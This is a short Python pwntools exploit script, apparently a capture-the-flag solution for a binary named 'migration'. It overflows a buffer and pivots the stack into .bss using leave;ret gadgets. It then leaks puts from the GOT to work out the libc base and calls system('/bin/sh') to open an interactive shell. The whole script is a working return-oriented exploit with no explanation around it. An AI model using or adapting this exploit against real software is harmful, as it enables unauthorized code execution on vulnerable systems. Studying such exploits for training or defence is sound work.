from pwn import *


s = process("migration")

elf = ELF("migration")

libc = ELF("./libc")

leave_ret = 0x08048504
pr = 0x08048586
s.recvuntil(":")

print "bss : " + hex(elf.bss()+0x300)

pay = "A"*0x28
pay += p32(elf.bss()+0x300)
pay += p32(elf.plt['read'])
pay += p32(leave_ret)
pay += p32(0)
pay += p32(elf.bss()+0x300)
pay += p32(100)

s.send(pay)

pay = p32(elf.bss()+0x400)
pay += p32(elf.plt['puts'])
pay += p32(pr)
pay += p32(elf.got['puts'])

pay += p32(elf.plt['read'])
pay += p32(leave_ret)
pay += p32(0)
pay += p32(elf.bss()+0x400)
pay += p32(100)

s.send(pay)

s.recvline()
puts_libc = u32(s.recv(4))
print "puts_libc : " + hex(puts_libc)
libc_base = puts_libc - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search("/bin/sh\00"))
print "libc_base : "  + hex(libc_base)
print "system : " + hex(system)
print "bin_sh : " + hex(bin_sh)

pay = "A"*4
pay += p32(system)
pay += "B"*4
pay += p32(bin_sh)

s.send(pay)

s.interactive()
